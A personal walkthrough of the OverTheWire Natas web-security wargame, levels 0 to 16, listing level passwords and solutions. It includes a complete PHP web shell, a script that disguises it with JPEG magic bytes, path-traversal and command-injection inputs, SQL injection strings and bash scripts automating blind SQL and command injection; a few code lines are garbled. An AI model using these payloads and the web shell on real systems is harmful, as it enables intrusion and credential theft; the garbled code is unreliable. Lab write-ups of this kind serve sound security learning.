# Natas

## Natas0

```
view-source:http://natas0.natas.labs.overthewire.org/
the password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto
```

## Natas1

```
view-source:http://natas1.natas.labs.overthewire.org/  
the password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
```

## Natas2

```
view-source:http://natas2.natas.labs.overthewire.org/files/pixel.png  
http://natas2.natas.labs.overthewire.org/files/  
http://natas2.natas.labs.overthewire.org/files/users.txt  

# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## natas 3

```
http://natas3.natas.labs.overthewire.org/robots.txt  
http://natas3.natas.labs.overthewire.org/s3cr3t/  
http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt  
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ  
```

## Natas 4

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"  
```
F12 -> network -> reload page ->  edit headers  
Add following  
Referer: http://natas5.natas.labs.overthewire.org/  

resend  
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq  
```


## Natas 5

Access disallowed. You are not logged in  

```
F12 -> network -> load page -> look at cookie header.  
Cookie: __cfduid=d95a9db8b02c419d414e69605e6cd5dc81557856656; loggedin=0   

Change loggedin=0 to loggedin=1  
resend  

Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1  
```

## natas 6

```
Click on view source code.  
This gives us 1 script
```

```php
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

```
If POST = $Secret -> Access granted.  
Where is secrect ?  
Look at include  
view-source:http://natas6.natas.labs.overthewire.org/includes/secret.inc
```

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9  
```

## Natas 7

```
View source  
hint: password for webuser natas8 is in /etc/natas_webpass/natas8  
```

```html
<a href="index.php?page=home">Home</a>  
<a href="index.php?page=about">About</a>  
``` 

HREFs look vulnerable to LFI

```
http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/natas_webpass/natas8  
```

DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe  

## Natas 8

click view source  

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
``` 

A string has been encoded with the function encodeSecret.

base64_encode — Encodes data with MIME base64  
https://www.php.net/base64_encode  

strrev — Reverse a string  
https://www.php.net/manual/en/function.strrev.php   

bin2hex — Convert binary data into hexadecimal representation    
https://www.php.net/manual/en/function.bin2hex.php  

We need to create a decodeSecret function. Lets find commands to reverse the encoding.  

base64_decode  
https://www.php.net/manual/en/function.base64-decode.php  

string reverse  
https://www.php.net/manual/en/function.strrev.php  

hex2bin  
https://www.php.net/manual/en/function.hex2bin.php


```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function dencodeSecret($secret) {
    return base64_decode(strrev(hex2bin($secret)));
}

echo dencodeSecret($encodedSecret);

[Running] php "c:\_git\github\tempCodeRunnerFile.php"
oubWYf2kBq
[Done] exited with code=0 in 0.154 seconds
```

```
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl  
```

## natas 9
view source

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

No input validation. We can do command injection. lets just add a additional file to grep and search for something that is likely to be in the password.

```
1 /etc/natas_webpass/natas10
```

```
Output:

/etc/natas_webpass/natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

## natas10

view source

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
```

now there is some input validation to avoid things like ; | and &, but our trick from natas09 still works here.

```
1 /etc/natas_webpass/natas11
```

```
Output:

/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

## natas11
Cookies are protected with XOR encryption

view source  

```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';
1 /etc/natas_webpass/natas11
    // Iterate through eac1 /etc/natas_webpass/natas11h character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);


<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```

Set-Cookie  
```
data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
```

Cookie
``` 
__cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmb=176859643.2.10.1568619071; __utmc=176859643; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
```

```
#ffffff
ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
```

```
#131516
ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRgt7REYOaAw=
```

```
#141617
ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRgx7R0YPaAw=
```

It seems the color code is in the cookie.

Lets reuse the PHP code given to us and update it.

```php
function xor_t_k($intext,$inkey) {
    $key = $inkey;
    $text = $intext;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

$JsonData = json_encode($defaultdata);
$_COOKIE = array("__cfduid" => "dc2e23c92b1d237ff6fcd21eeaace26841568619071",
"__utma" => "176859643.1037695426.1568619071.1568619071.1568619071.1",
"__utmb" => "176859643.2.10.1568619071; __utmc=176859643",
"__utmz" => "176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)",
"utmt" => "1",
"data" => "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw="
);
$basedecoded = base64_decode($_COOKIE["data"]);
# print $basedecoded;
# print $JsonData;
$XOR_Key = xor_t_k($JsonData, $basedecoded);
print $XOR_Key;
```

```
[Running] php "/home/justin-p/tempCodeRunnerFile.php"
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
[Done] exited with code=0 in 0.022 seconds
```

```php
function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
$_COOKIE = array("__cfduid" => "dc2e23c92b1d237ff6fcd21eeaace26841568619071",
"__utma" => "176859643.1037695426.1568619071.1568619071.1568619071.1",
"__utmb" => "176859643.2.10.1568619071; __utmc=176859643",
"__utmz" => "176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)",
"utmt" => "1",
"data" => "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw="
);
$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
print print_r($tempdata, true);
```

```
[Running] php "/home/justin-p/tempCodeRunnerFile.php"
Array
(
    [showpassword] => no
    [bgcolor] => #ffffff
)

[Done] exited with code=0 in 0.021 seconds
```

```php
function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
$pass_yes = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
$json_pass_yes = json_encode($pass_yes);
#print $json_pass_yes;
$xor_pass_yes = xor_encrypt($json_pass_yes);
#print $xor_pass_yes;
$base_pass_yes = base64_encode($xor_pass_yes);
print $base_pass_yes;
```

```
[Running] php "/home/justin-p/tempCodeRunnerFile.php"
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
[Done] exited with code=0 in 0.018 seconds
```

```php
function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
$pass_yes = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
$json_pass_yes = json_encode($pass_yes);
#print $json_pass_yes;
$xor_pass_yes = xor_encrypt($json_pass_yes);
#print $xor_pass_yes;
$base_pass_yes = base64_encode($xor_pass_yes);
$_COOKIE = elserray("__cfduid" => "dc2e23c92b1d237ff6fcd21eeaace26841568619071",
"__utma" =>else"176859643.1037695426.1568619071.1568619071.1568619071.1",
"__utmb" => "176859643.2.10.1568619071; __utmc=176859643",
"__utmz" => "176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)",
"utmt" => "1",
"data" => "$base_pass_yes"
);

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

$data = loadData($defaultdata);
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
```

[Running] php "/home/justin-p/tempCodeRunnerFile.php"
The password for natas12 is <censored><br>
[Done] exited with code=0 in 0.02 seconds

```javascript
document.cookie="data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"
``` 

or use burp

```
The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```

```php
function xor_encrypt($in) {
    $key = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw");
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo xor_encrypt(json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff")));

function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo base64_encode(xor_encrypt(json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"))));
```


## natas12

```html
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


No filetype valiation.  
Simple PHP shell

```php
<!-- By justin-p (https://raw.githubusercontent.com/justin-p/sec-stuff/master/php/simple_shell/simple_shell.php) based of https://github.com/artyuum/Simple-PHP-Web-Shell/ -->
<?php if (empty($_POST['cmd'])) {$cmd = "";} elseif (!empty($_POST['cmd'])) {$cmd = shell_exec($_POST['cmd']);} ?>
<form method="POST"><input type="text" style="width:100%;height:25px;" name="cmd" id="cmd" value="<?php if (!empty($_POST['cmd'])) {htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8');} ?>" required><button type="submit" class="btn btn-primary">Execute</button></form>
<?php if (!$cmd && $_SERVER['REQUEST_METHOD'] != 'POST'): ?><small>Enter command.</small> <?php elseif ($cmd): ?><pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre> <?php elseif (!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'): ?><small>No results.</small> <?php endif; ?>
```

Now we just need to update the file name   
```
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
```

to  

```
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.php" />
```

We can do this with Burp or F12 -> network -> headers -> edit and resend

```
Content-Disposition: form-data; name="filename"

zpfrokehzg.php
```

```
The file upload/zpfrokehzg.php has been uploaded
``` 

From here we can simply use the shell to cat the file

```
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

## natas13

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "<censored>" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    
    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

exif_imagetype checks the first bytes of the 'image' and verify its a image.  
These first bytes are also called the 'magic number' or 'magic bytes'.

If we change the first bytes of our file to match a image file, lets say jpg, exif_imagetype will lets it pass.
FF D8 FF DB is the JPEG magic number  
https://www.wikiwand.com/en/List_of_file_signatures   

I used hexdump for VSCode https://marketplace.visualstudio.com/items?itemName=slevesque.vscode-hexdump 

```
Offset:   00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 	
00000000: FF D8 FF DB 3C 21 2D 2D 20 42 79 20 6A 75 73 74    .X.[<!--.By.just
00000010: 69 6E 2D 70 20 28 68 74 74 70 73 3A 2F 2F 72 61    in-p.(https://ra
```

Python could also be used to add the magic bytes.

```python
fh = open('p_shell.php', 'w')
fh.write('\xFF\xD8\xFF\xE0' + '<?php if (empty($_POST[\'cmd\'])) {$cmd = "";} elseif (!empty($_POST[\'cmd\'])) {$cmd = shell_exec($_POST[\'cmd\']);} ?><form method="POST"><input type="text" style="width:100%;height:25px;" name="cmd" id="cmd" value="<?php if (!empty($_POST[\'cmd\'])) {htmlspecialchars($_POST[\'cmd\'], ENT_QUOTES, \'UTF-8\');} ?>" required><button type="submit" class="btn btn-primary">Execute</button></form><?php if (!$cmd && $_SERVER[\'REQUEST_METHOD\'] != \'POST\'): ?><small>Enter command.</small> <?php elseif ($cmd): ?><pre><?= htmlspecialchars($cmd, ENT_QUOTES, \'UTF-8\') ?></pre> <?php elseif (!$cmd && $_SERVER[\'REQUEST_METHOD\'] == \'POST\'): ?><small>No results.</small> <?php endif; ?>')
fh.close()
```

Upload the file and cat the password file  
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

## Natas 14

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "<censored>" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

```
SELECT * from users where username="username_input" and password="password_input"
```

so if we input   
```
natas14
pass" or "1"="1  
```

it will look like this.

```
SELECT * from users where username="natas14" or and password="pass" or "1"="1"
```

Since the or is always true ( 1 = 1) the password doesnt need to be correct.

```
AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

## Natas15

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas15", "pass": "<censored>" };</script></head>
<body>
<h1>natas15</h1>
<div id="content">
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

blind sql injection  

```
Input  : natas16  
Query  : SELECT * from users where username="natas16"  
Result : true  
```

```
Input  : natas16" AND "1"="1  
Query  : SELECT * from users where username="natas16" AND "1"="1"  
Result : true  
```


A good next thing to know whould be the password lenght. Lets first test the username lenght.  
 
Testing username lenght   
We should get a 'This user exists.' if the lenght of username is 7.   

```
input  : natas16" AND (SELECT LENGTH(username) FROM users WHERE username="natas16" LIMIT 1)=1#   
Query  : SELECT * from users where username="natas16" AND (SELECT LENGTH(username) FROM users WHERE username="natas16" LIMIT 1)=1#  
Result : false  
```

```
input  : natas16" AND (SELECT LENGTH(username) FROM users WHERE username="natas16" LIMIT 1)=7#  
Query  : SELECT * from users where username="natas16" AND (SELECT LENGTH(username) FROM users WHERE username="natas16" LIMIT 1)=7#  
Result : true  
```

So now lets test the password lenght.  

```
input  : natas16" AND (SELECT LENGTH(password) FROM users WHERE username="natas16" LIMIT 1)=1#  
Query  : SELECT * from users where username="natas16" AND (SELECT LENGTH(password) FROM users WHERE username="natas16" LIMIT 1)=1#  
Result : false  
```

so far all the passwords had a lenght of 32, so lets that that.  

```
input  : natas16" AND (SELECT LENGTH(password) FROM users WHERE username="natas16" LIMIT 1)=32#  
Query  : SELECT * from users where username="natas16" AND (SELECT LENGTH(password) FROM users WHERE username="natas16" LIMIT 1)=32#  
Result : true  
```

now lets test the actual password  
first verify with the username  

```
Input  : natas16" AND (SELECT username FROM users WHERE username="natas16" LIMIT 1) LIKE "a%"#  
Query  : SELECT * from users where username="natas16" AND (SELECT username FROM users WHERE username="natas16" LIMIT 1) LIKE "a%"#  
Result : false  
```

```
Input  : natas16" AND (SELECT username FROM users WHERE username="natas16" LIMIT 1) LIKE "n%"#  
Query  : SELECT * from users where username="natas16" AND (SELECT username FROM users WHERE username="natas16" LIMIT 1) LIKE "n%"#  
Result : true  
```

So we know this works. Now lets try the password.  

```
Input  : natas16" AND (SELECT password FROM users WHERE username="natas16" LIMIT 1) LIKE "W%"#  
Query  : SELECT * from users where username="natas16" AND (SELECT password FROM users WHERE username="natas16" LIMIT 1) LIKE "W%"#
Result : true
```

but if we try  

```
Input  : natas16" AND (SELECT password FROM users WHERE username="natas16" LIMIT 1) LIKE "w%"#  
Query  : SELECT * from users where username="natas16" AND (SELECT password FROM users WHERE username="natas16" LIMIT 1) LIKE "w%"#
Result : true
```

this also works. This is because LIKE is case insensitive, we should use LIKE BINARY.  

```
Input  : natas16" AND (SELECT username FROM users WHERE username="natas16" LIMIT 1) LIKE BINARY "N%"#  
Query  : SELECT * from users where username="natas16" AND (SELECT username FROM users WHERE username="natas16" LIMIT 1) LIKE BINARY "N%"#
Result : false  
```

```
Input  : natas16" AND (SELECT username FROM users WHERE username="natas16" LIMIT 1) LIKE BINARY "n%"#  
Query  : SELECT * from users where username="natas16" AND (SELECT username FROM users WHERE username="natas16" LIMIT 1) LIKE BINARY "n%"#
Result : true  
```

```
Input  : natas16" AND (SELECT password FROM users WHERE username="natas16" LIMIT 1) LIKE BINARY "w%"#  
Query  : SELECT * from users where username="natas16" AND (SELECT password FROM users WHERE username="natas16" LIMIT 1) LIKE BINARY "w%"#
Result : false   
```

```
natas16" AND (SELECT password FROM users WHERE username="natas16" LIMIT 1) LIKE BINARY "W%"#  
Query  : SELECT * from users where username="natas16" AND (SELECT password FROM users WHERE username="natas16" LIMIT 1) LIKE BINARY "W%"#
Result : true
```


Lets create a bash script to get the password

```bash
passwordlenght=32
CurrentChar=0
password=""
while [ $CurrentChar -ne $passwordlenght ]
do
    for letter in {{a..z},{A..Z},{0..9}}; do
        injection="\" AND (SELECT password FROM users WHERE username=\"natas16\" LIMIT 1) LIKE BINARY \"$password$letter%\"#"
        data="username=natas16$injection"
        curl_output=$(curl -s 'http://natas15.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==' -d "$data")
        if echo $curl_output | grep -q "This user exists."; then
            password="${password}${letter}"
            CurrentChar=$(( $CurrentChar + 1 ))
            echo "[+] Password: $password"
            continue 2
        fi
    done
done 
``` 
```
[+] Password: W
[+] Password: Wa
[+] Password: WaI
[+] Password: WaIH
[+] Password: WaIHE
[+] Password: WaIHEa
[+] Password: WaIHEac
[+] Password: WaIHEacj
[+] Password: WaIHEacj6
[+] Password: WaIHEacj63
[+] Password: WaIHEacj63w
[+] Password: WaIHEacj63wn
[+] Password: WaIHEacj63wnN
[+] Password: WaIHEacj63wnNI
[+] Password: WaIHEacj63wnNIB
[+] Password: WaIHEacj63wnNIBR
[+] Password: WaIHEacj63wnNIBRO
[+] Password: WaIHEacj63wnNIBROH
[+] Password: WaIHEacj63wnNIBROHe
[+] Password: WaIHEacj63wnNIBROHeq
[+] Password: WaIHEacj63wnNIBROHeqi
[+] Password: WaIHEacj63wnNIBROHeqi3
[+] Password: WaIHEacj63wnNIBROHeqi3p
[+] Password: WaIHEacj63wnNIBROHeqi3p9
[+] Password: WaIHEacj63wnNIBROHeqi3p9t
[+] Password: WaIHEacj63wnNIBROHeqi3p9t0
[+] Password: WaIHEacj63wnNIBROHeqi3p9t0m
[+] Password: WaIHEacj63wnNIBROHeqi3p9t0m5
[+] Password: WaIHEacj63wnNIBROHeqi3p9t0m5n
[+] Password: WaIHEacj63wnNIBROHeqi3p9t0m5nh
[+] Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhm
[+] Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```


WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

## Natas16

```php
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

$(grep -E ^8.* /etc/natas_webpass/natas17)hackers



```bash
passwordlenght=32
CurrentChar=0
password=""
while [ $CurrentChar -ne $passwordlenght ]
do
    for letter in {{a..z},{A..Z},{0..9}}; do
        curl_output=$(curl -s "http://natas16.natas.labs.overthewire.org/?needle="%"24"%"28grep+-E+"%"5E${password}${letter}.*+"%"2Fetc"%"2Fnatas_webpass"%"2Fnatas17"%"29hackers&submit=Search" -H "Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==")
        if echo $curl_output | grep -q -v "hackers"; then
            password="${password}${letter}"
            CurrentChar=$(( $CurrentChar + 1 ))
            echo "[+] Password: $password"
            continue 2
        fi
    done
done
```

```
[+] Password: 8
[+] Password: 8P
[+] Password: 8Ps
[+] Password: 8Ps3
[+] Password: 8Ps3H
